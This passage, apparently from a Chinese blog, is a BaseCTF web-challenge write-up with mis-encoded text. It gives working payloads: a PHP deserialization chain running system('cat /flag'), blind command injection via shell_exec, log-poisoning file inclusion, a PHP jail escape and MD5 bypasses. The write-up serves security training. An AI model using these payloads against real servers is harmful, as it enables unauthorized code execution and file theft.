class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ‰¾åˆ°evalå‡½æ•°è¾“å‡º,å¯ä»¥ä½¿cmdç­‰äºsystem(â€œcat &#x2F;flagâ€)è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå³æˆ‘ä»¬è¦è§¦å‘tostring()å‡½æ•°</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ç±»Sharké‡Œé¢çš„æœ‰ä¸ªç§æœ‰å±æ€§wordé‡ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥å°è¯•åœ¨è¿™é‡Œè¿›è¡Œè§¦å‘tostring()</p><p>ä½†æ˜¯ç§æœ‰å±æ€§ä¸èƒ½å¤Ÿç›´æ¥è°ƒç”¨,ç›´æ¥è¿›è¡Œå†…éƒ¨èµ‹å€¼(ä¹‹å‰æ˜¯è¿™é‡Œä¸ä¼š)ï¼Œä¹‹åç›´æ¥è§¦å‘invoke(),å½“å¯¹è±¡è°ƒç”¨å‡½æ•°æ—¶è§¦å‘ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹è§ç±»Seaé‡Œçš„animal,å°†Seaé‡Œçš„animalè°ƒç”¨ç»™Sharkå³å¯è§¦å‘invoke()ï¼Œä¹‹åå°±æ˜¯_get()é­”æœ¯æ–¹æ³•çš„è§¦å‘ï¼Œä»ä¸å¯è®¿é—®çš„å±æ€§é‡Œè¯»å–æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è°ƒç”¨ç±»Natureé‡Œçš„seaç»™$seaå³å¯ï¼Œè§¦å‘destruct().</p><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setWord</span>(<span class="params"><span class="variable">$word</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;word = <span class="variable">$word</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nature</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sea</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nature</span> = <span class="keyword">new</span> <span class="title class_">Nature</span>();</span><br><span class="line"><span class="variable">$sea</span> = <span class="keyword">new</span> <span class="title class_">Sea</span>();</span><br><span class="line"><span class="variable">$sink</span> = <span class="keyword">new</span> <span class="title class_">Sink</span>();</span><br><span class="line"><span class="variable">$shark</span> = <span class="keyword">new</span> <span class="title class_">Shark</span>();</span><br><span class="line"><span class="variable">$sea</span>-&gt;animal = <span class="variable">$shark</span>;</span><br><span class="line"><span class="variable">$nature</span>-&gt;sea = <span class="variable">$sea</span>;</span><br><span class="line"><span class="variable">$shark</span>-&gt;<span class="title function_ invoke__">setWord</span>(<span class="variable">$sink</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$nature</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ•°å­¦å¤§å¸ˆ"><a href="#æ•°å­¦å¤§å¸ˆ" class="headerlink" title="æ•°å­¦å¤§å¸ˆ"></a>æ•°å­¦å¤§å¸ˆ</h3><p>é¢˜ç›®æç¤ºï¼šæ¯ä¸€é“é¢˜ç›®éœ€è¦åœ¨ 5 ç§’å†…è§£å‡º, ä¼ å…¥åˆ° <code>$_POST[&#39;answer&#39;]</code> ä¸­, è§£å‡º 50 é“å³å¯, é™¤æ³•å–æ•´</p><p><img src="/img/1725763539178-5.png" alt="img"></p><p>è€ƒå¯Ÿä½¿ç”¨pythonçš„requestæ¥ç¼–å†™è„šæœ¬è¿›è¡Œè®¡ç®—</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾è¿™æ˜¯ä½ æ¥æ”¶åˆ°çš„ç®—å¼å’Œç­”æ¡ˆçš„URL</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge.basectf.fun:21216/&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">payload = &#123;<span class="string">&#x27;answer&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">response = s.post(url)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># æ¨¡æ‹Ÿ50æ¬¡POSTè¯·æ±‚</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    response_text = response.text</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    start_index = response_text.find(<span class="string">&#x27;second &#x27;</span>) + <span class="number">7</span>  <span class="comment"># 7æ˜¯&quot;second &quot;çš„â»“åº¦</span></span><br><span class="line">    end_index = response_text.find(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    expression = response_text[start_index:end_index]</span><br><span class="line">    partten = <span class="string">r&#x27;Ã·&#x27;</span></span><br><span class="line">    expression = re.sub(partten, <span class="string">&#x27;//&#x27;</span>, expression)</span><br><span class="line">    partten = <span class="string">r&#x27;Ã—&#x27;</span></span><br><span class="line">    expression = re.sub(partten, <span class="string">&#x27;*&#x27;</span>, expression)</span><br><span class="line">    <span class="comment"># è®¡ç®—ç»“æœ</span></span><br><span class="line">    <span class="built_in">print</span>(expression)</span><br><span class="line">    answer = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line">    <span class="comment"># å‘é€POSTè¯·æ±‚</span></span><br><span class="line">    payload = &#123;<span class="string">&#x27;answer&#x27;</span>: answer&#125;</span><br><span class="line">    response = s.post(url, data=payload, cookies=response.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-6.png" alt="img"></p><p>BaseCTF{2112aa5d-5928-4a13-bca4-d9b621cb027b}</p><h3 id="æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5"><a href="#æ‰€ä»¥ä½ è¯´ä½ æ‡‚-MD5" class="headerlink" title="æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?"></a>æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?</h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼šmd5 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5 äº†?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$apple</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;banana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$apple</span> !== <span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»€ä¹ˆ? ä½ ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// åŠ å¤§å‰‚é‡!</span></span><br><span class="line"><span class="comment">// æˆ‘è¦è®©ä»–æˆä¸º string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;éš¾å—?ä¸éš¾!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ è¿˜æ˜¯ç»•è¿‡å»äº†?</span></span><br><span class="line"><span class="comment">// å“¦å“¦å“¦, æˆ‘å°‘äº†ä¸€ä¸ªç­‰äºå·</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¥ä¸ºè¿™å°±ç»“æŸäº†</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ æƒ³çœ‹åˆ° random çš„å€¼å—?</span></span><br><span class="line"><span class="comment">// ä½ ä¸æ˜¯å¾ˆæ‡‚ MD5 å—? é‚£æˆ‘å°±å‘Šè¯‰ä½ ä»–çš„ MD5 å§</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¤è¾“äº†, çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5</span></span><br><span class="line"><span class="comment">// é‚£ flag å°±ç»™ä½ å§</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;çœ‹æ ·å­ä½ çœŸçš„å¾ˆæ‡‚ MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?</span><br></pre></td></tr></table></figure><p>â¼€å…±æœ‰ 4 å±‚ï¼Œä¾æ¬¡æ¥ç»•è¿‡ã€‚ </p><p>ç¬¬â¼€å±‚å¯ä»¥ç›´æ¥æ•°ç»„ç»•è¿‡ã€‚ </p><p>ç¬¬â¼†å±‚å’Œç¬¬ä¸‰å±‚éƒ½å¯ä»¥ç›´æ¥æ„é€  md5 ç¢°æ’ç»•è¿‡ã€‚ </p><p>ç¬¬å››å±‚æ¶‰åŠåˆ° md5 â»“åº¦æ‰©å±•æ”»å‡»ï¼Œå³å·²çŸ¥â¼€ä¸ªå­—ç¬¦ä¸²çš„ md5 å€¼å’Œâ»“åº¦ï¼Œå¹¶ä¸”è¦å¾€ä»–åâ¾¯æ‹¼æ¥â¼€ä¸ªå¯æ§ </p><p>çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶åâ¾¯çš„å­—ç¬¦ä¸²ä»â½½è®¡ç®—å¾—åˆ°æ‹¼æ¥åå­—ç¬¦ä¸²çš„ md5 å€¼ã€‚ </p><p>åœ¨è¿™é“é¢˜ä¸­ï¼Œrandom çš„â»“åº¦å·²çŸ¥ï¼ˆæœ¬åœ°è·‘â¼€ä¸‹æ˜¯96ï¼‰ï¼Œrandom çš„ md5 å€¼å·²çŸ¥ï¼Œå¹¶ä¸”æ‹¼æ¥çš„å­—ç¬¦ä¸²å¯ </p><p>æ§ï¼ˆéœ€è¦ä»¥ admin ç»“å°¾ï¼‰ï¼Œè¿™â¾¥é€šè¿‡ä¸‹â¾¯è¿™ä¸ªè„šæœ¬æ„é€ </p><h3 id="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"><a href="#ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³" class="headerlink" title="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"></a>ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³</h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼šæ— å›æ˜¾RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>æ–¹æ³•ä¸€ï¼šä½¿ç”¨teeè¿›è¡Œå†™å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=cat /flag | tee <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-7.png" alt="img"></p><p>æ–¹æ³•äºŒï¼šä½¿ç”¨&gt;è¿›è¡Œæ–‡ä»¶å†™å…¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=cat /flag &gt; <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-8.png" alt="img"></p><h3 id="æ»¤ä¸ªä¸åœ"><a href="#æ»¤ä¸ªä¸åœ" class="headerlink" title="æ»¤ä¸ªä¸åœ"></a>æ»¤ä¸ªä¸åœ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POSTä¼ å‚incompetentç­‰äºHelloWorldå³å¯</p><p>ç¬¬â¼€å±‚å¾ˆç®€å•ï¼Œå°±æ˜¯â¼€ä¸ªç®€å•çš„åˆ¤æ–­å­—ç¬¦ä¸²ç›¸ç­‰ï¼Œä¼ â¼ŠæŒ‡å®šå­—ç¬¦ä¸²å³å¯ã€‚ </p><p>ç¬¬â¼†å±‚æ˜¯â½‚ä»¶åŒ…å«æ¼æ´ï¼Œè¿‡æ»¤äº†å¾ˆå¤šåè®®ï¼Œè¿™â¾¥å¯ä»¥ä½¿â½¤â½‡å¿—åŒ…å«ã€‚ </p><p>åœ¨ UA å¤´ä¸­å†™â¼Šâ¼€å¥è¯â½Šâ»¢ï¼Œç„¶ååŒ…å« &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log ã€‚</p><p><img src="/img/1725763539179-9.png" alt="img"></p><h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>phpæ²™ç›’é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Welcome to My Jail</span><br><span class="line">Do You Like My Jail?</span><br></pre></td></tr></table></figure><p>phpæ²™ç›’é€ƒé€¸</p><p>phpç‰ˆæœ¬å°äº8æ—¶ï¼ŒGETè¯·æ±‚çš„å‚æ•°å«æœ‰***.***   åˆ™ä¼šè½¬ä¸º***_***</p><p>ä½†æ˜¯å¦‚æœç›´æ¥æœ‰**[** ,è¿™ä¸ª[ ä¼šè¢«ç›´æ¥è½¬åŒ–ä¸º_  ,ä½†æ˜¯å¦‚æœåé¢æœ‰.  ,è¿™ä¸ª.å°±ä¸ä¼šè½¬åŒ–ä¸º_</p><p>è¿™é‡Œä½¿ç”¨highlight_fileå‡½æ•°å¯ä»¥ç»•è¿‡</p><p>Payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/f*&quot;</span>)[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h3 id="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"><a href="#flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ" class="headerlink" title="flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ"></a>flagç›´æ¥è¯»å–ä¸å°±è¡Œäº†ï¼Ÿ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># æˆ‘æŠŠflagè—åœ¨ä¸€ä¸ªsecretæ–‡ä»¶å¤¹é‡Œé¢äº†ï¼Œæ‰€ä»¥è¦å­¦ä¼šéå†å•Š~</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$J1ng</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line"><span class="variable">$Hong</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line"><span class="variable">$Keng</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"><span class="variable">$Wang</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="variable">$Keng</span>(<span class="variable">$Wang</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$J1ng</span>(<span class="variable">$Hong</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>PHP æ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨</strong> DirectoryIterator ç±»æä¾›äº†ä¸€ç§ç®€å•çš„æ¥å£ï¼Œç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•çš„å†…å®¹ã€‚å®ƒå…è®¸é€ä¸ªè®¿é—®ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•</p><p><strong>SplFileObject ç±»ç®€ä»‹</strong>SplFileObject 